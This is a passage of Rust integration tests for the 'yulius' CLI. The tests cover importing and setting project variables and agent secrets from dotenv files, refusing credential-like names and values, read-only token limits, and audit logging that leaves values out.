            ],
            "--state belongs to one project",
        ),
        (
            vec!["--to", "agent", "--replace-state", "x.env"],
            "--replace-state applies to --state",
        ),
        (
            vec![
                "--to",
                "agent",
                "--yes",
                "--state",
                "OPS=~/.quartio-operator-20260901",
                "--state",
                "OPS=~/.quartio-operator-20260901",
            ],
            "OPS is given twice",
        ),
    ] {
        let mut all = vec!["secrets", "import", "--sandbox", "acme/shop"];
        all.extend(args);
        let (code, out, err) = yulius_cli(laptop, &all, "").await?;
        assert_eq!(code, Some(1), "{out}{err}");
        assert!(err.contains(said), "{said}: {err}");
    }

    let audit = w.h.store.vault_audit(50).await?;
    let by_alice = |action: &str| {
        audit
            .iter()
            .any(|e| e.action == action && e.actor == "alice")
    };
    for action in [
        "vault.state.import",
        "vault.state.export",
        "vault.state.replace",
    ] {
        assert!(by_alice(action), "{action} in {audit:?}");
    }
    Ok(())
}

/// SPEC-275 AC1, AC2 (VAR-002, VAR-003, VAR-005): with only an operate token stored, the CLI sets
/// variables by argument and from a dotenv file, lists them in plain and deletes them; a name that
/// is an agent secret or says it is a credential is refused and nothing of it is written; a read
/// token lists but cannot set; every change is audited without its value.
#[tokio::test]
async fn variables_are_set_from_a_laptop_and_listed_in_plain() -> TestResult {
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (alice, _) = w.user("alice", false).await?;
    w.grant("alice", "acme/shop", "admin");
    let browser = w.browser(&alice).await?;
    let listener = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", listener.addr);
    let home = tempfile::tempdir()?;
    let home = home.path();
    let operate = text(&make_token(&w, &browser, "laptop", "operate").await?["token"]).to_owned();
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{operate}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    let vars = |args: &[&str]| -> Vec<String> {
        ["vars", "-p", "acme/shop"]
            .iter()
            .chain(args)
            .map(|a| (*a).to_owned())
            .collect()
    };
    let cli = |args: Vec<String>| {
        let home = home.to_path_buf();
        async move {
            let args: Vec<&str> = args.iter().map(String::as_str).collect();
            yulius_cli(&home, &args, "").await
        }
    };

    let (code, out, err) = cli(vars(&[
        "set",
        "OVH_ENDPOINT=ovh-ca",
        "--description",
        "OVH region",
    ]))
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    std::fs::write(
        home.join("vars.env"),
        "# Pipedream environment\nPIPEDREAM_PROJECT_ENVIRONMENT=production\n\
         LANGFUSE_BASE_URL=https://cloud.langfuse.com\nOLD_FLAG=1\n",
    )?;
    let (code, out, err) = cli(vars(&["import", "vars.env"])).await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("LANGFUSE_BASE_URL"), "{out}");
    let (code, out, err) = cli(vars(&["delete", "OLD_FLAG"])).await?;
    assert_eq!(code, Some(0), "{out}{err}");

    let (code, out, err) = cli(vars(&["list"])).await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert_eq!(
        out.trim(),
        "LANGFUSE_BASE_URL=https://cloud.langfuse.com\n# OVH region\nOVH_ENDPOINT=ovh-ca\n\
         # Pipedream environment\nPIPEDREAM_PROJECT_ENVIRONMENT=production"
    );

    // Refused before sending: a credential's name; by the server: an agent secret's name.
    std::fs::write(home.join("mixed.env"), "REGION=eu\nSHOP_API_KEY=abc\n")?;
    let (code, out, err) = cli(vars(&["import", "mixed.env"])).await?;
    assert_eq!(code, Some(2), "{out}{err}");
    assert!(
        err.contains("SHOP_API_KEY") && err.contains("yulius secrets import"),
        "{err}"
    );
    // Review round 1: a value that carries a credential is refused whatever its name, and a
    // malformed argument is not echoed.
    let (code, out, err) = cli(vars(&["set", "DATABASE_URL=postgres://u:p4ss@db/app"])).await?;
    assert_eq!(code, Some(2), "{out}{err}");
    assert!(
        err.contains("DATABASE_URL") && !err.contains("p4ss"),
        "{err}"
    );
    let (code, out, err) = cli(vars(&["set", "no-equals-sign-secretish"])).await?;
    assert_eq!(code, Some(2), "{out}{err}");
    assert!(!err.contains("secretish"), "{err}");
    let created = call(
        &w.h.router,
        Method::POST,
        "/api/sandboxes/s1/agent-secrets",
        Some(json!({"name": "SHOP_ACCOUNT", "value": "shop-account-0123456"})),
        &browser,
    )
    .await?;
    assert_eq!(created.status, StatusCode::CREATED, "{}", created.body);
    let (code, out, err) = cli(vars(&["set", "REGION=eu", "SHOP_ACCOUNT=acme"])).await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(err.contains("SHOP_ACCOUNT is an agent secret"), "{err}");
    let listed = call(
        &w.h.router,
        Method::GET,
        "/api/sandboxes/s1/variables",
        None,
        &browser,
    )
    .await?;
    let listed = listed.body["variables"].to_string();
    assert!(
        !listed.contains("REGION"),
        "nothing of it was set: {listed}"
    );

    // A read token lists, never sets.
    let read = text(&make_token(&w, &browser, "reader", "read").await?["token"]).to_owned();
    let reader = bearer(&read);
    let (failed, shown, _) = remote(
        &w,
        &reader,
        "variables_list",
        json!({"project": "acme/shop"}),
    )
    .await?;
    assert!(!failed && shown.contains("OVH_ENDPOINT=ovh-ca"), "{shown}");
    // VAR-008: secrets_list names the variables beside the secrets, values in plain.
    let (failed, _, listed) =
        remote(&w, &reader, "secrets_list", json!({"project": "acme/shop"})).await?;
    assert!(!failed);
    assert_eq!(listed["variables"][1]["name"], "OVH_ENDPOINT", "{listed}");
    assert_eq!(listed["variables"][1]["value"], "ovh-ca", "{listed}");
    assert_eq!(
        listed["variables"][1]["description"], "OVH region",
        "{listed}"
    );
    let names = served(&w, &reader).await?;
    assert!(names.iter().all(|n| n != "variables_set"), "{names:?}");
    let (failed, said, _) = remote(
        &w,
        &reader,
        "variables_set",
        json!({"project": "acme/shop", "variables": [{"name": "X_Y", "value": "z"}]}),
    )
    .await?;
    assert!(failed && said.contains("read-only"), "{said}");

    let audit = audits(&w, "s1").await?;
    let changes: Vec<(&str, &str, &str)> = audit
        .iter()
        .filter(|(action, _, _)| action.starts_with("variable."))
        .map(|(a, actor, d)| (a.as_str(), actor.as_str(), d.as_str()))
        .collect();
    assert_eq!(
        changes,
        [
            ("variable.delete", "alice", "OLD_FLAG"),
            ("variable.create", "alice", "OLD_FLAG"),
            ("variable.create", "alice", "LANGFUSE_BASE_URL"),
            ("variable.create", "alice", "PIPEDREAM_PROJECT_ENVIRONMENT"),
            ("variable.create", "alice", "OVH_ENDPOINT"),
        ]
    );
    assert!(
        audit.iter().any(|(a, actor, d)| a == "remote.tool"
            && actor == "remote:alice"
            && d.contains("variables_set")),
        "{audit:?}"
    );
    let all = format!("{audit:?}");
    assert!(
        !all.contains("ovh-ca") && !all.contains("production"),
        "{all}"
    );
    Ok(())
}

/// SPEC-275 AC4 (VAR-006, VAR-007): `yulius secrets import --yes` of a company `.env` sends its
/// keys as agent secrets and its plain values (a short region, a plain word, a base URL, an
/// e-mail address) as project variables; a credential's name keeps its value a secret; with
/// `--no-vars` nothing goes to variables.
#[tokio::test]
async fn a_secrets_import_sends_plain_values_to_project_variables() -> TestResult {
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (alice, _) = w.user("alice", false).await?;
    w.grant("alice", "acme/shop", "admin");
    let browser = w.browser(&alice).await?;
    let listener = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", listener.addr);
    let home = tempfile::tempdir()?;
    let home = home.path();
    let operate = text(&make_token(&w, &browser, "laptop", "operate").await?["token"]).to_owned();
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{operate}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    std::fs::write(
        home.join("company.env"),
        "OVH_ENDPOINT=ovh-ca\n# Pipedream's environment\nPIPEDREAM_PROJECT_ENVIRONMENT=production\n\
         LANGFUSE_BASE_URL=https://cloud.langfuse.com\nCONTACT_EMAIL=ops@quartio.example\n\
         API_TOKEN=production\nOPENAI_API_KEY=synthetic-openai-key-0123456789abcdef\n",
    )?;
    let import = [
        "secrets",
        "import",
        "--to",
        "agent",
        "--sandbox",
        "acme/shop",
        "--yes",
        "company.env",
    ];
    let (code, out, err) = yulius_cli(home, &import, "").await?;
    // API_TOKEN=production: a credential's name keeps it out of variables, and SPEC-274 refuses
    // it as a secret (ordinary text), so the run is not ok.
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(out.contains("Imported 1, 4 as project variables"), "{out}");
    assert!(
        out.contains("API_TOKEN") && out.contains("a configuration word"),
        "{out}"
    );
    for value in ["ovh-ca", "cloud.langfuse", "ops@", "synthetic-openai"] {
        assert!(!out.contains(value), "said {value}: {out}");
    }

    let secrets: Vec<String> = agent_secrets(&w, "s1", &browser)
        .await?
        .iter()
        .map(|s| text(&s["name"]).to_owned())
        .collect();
    assert_eq!(secrets, ["OPENAI_API_KEY"]);
    let listed = call(
        &w.h.router,
        Method::GET,
        "/api/sandboxes/s1/variables",
        None,
        &browser,
    )
    .await?;
    let variables: Vec<(String, String, String)> = listed.body["variables"]
        .as_array()
        .ok_or("variables")?
        .iter()
        .map(|v| {
            (
                text(&v["name"]).to_owned(),
                text(&v["value"]).to_owned(),
                text(&v["description"]).to_owned(),
            )
        })
        .collect();
    let var = |n: &str, v: &str, d: &str| (n.to_owned(), v.to_owned(), d.to_owned());
    assert_eq!(
        variables,
        [
            var("CONTACT_EMAIL", "ops@quartio.example", ""),
            var("LANGFUSE_BASE_URL", "https://cloud.langfuse.com", ""),
            var("OVH_ENDPOINT", "ovh-ca", ""),
            var(
                "PIPEDREAM_PROJECT_ENVIRONMENT",
                "production",
                "Pipedream's environment"
            ),
        ]
    );

    // Run again: everything exists and nothing is sent (API_TOKEN is still refused).
    let (code, out, err) = yulius_cli(home, &import, "").await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(out.contains("Nothing new to import"), "{out}");

    // --no-vars: a new plain value is checked as a secret again (too short: skipped).
    std::fs::write(home.join("more.env"), "SECOND_REGION=ovh-us\n")?;
    let (code, out, err) = yulius_cli(
        home,
        &[
            "secrets",
            "import",
            "--to",
            "agent",
            "--sandbox",
            "acme/shop",
            "--yes",
            "--no-vars",
            "more.env",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(
        out.contains("SECOND_REGION") && out.contains("at least 8"),
        "{out}"
    );
    // --no-vars belongs to one project's agent secrets.
    let (code, out, err) = yulius_cli(
        home,
        &[
            "secrets",
            "import",
            "--to",
            "agent",
            "--instance",
            "--no-vars",
            "more.env",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(err.contains("--no-vars applies"), "{err}");
    Ok(())
}
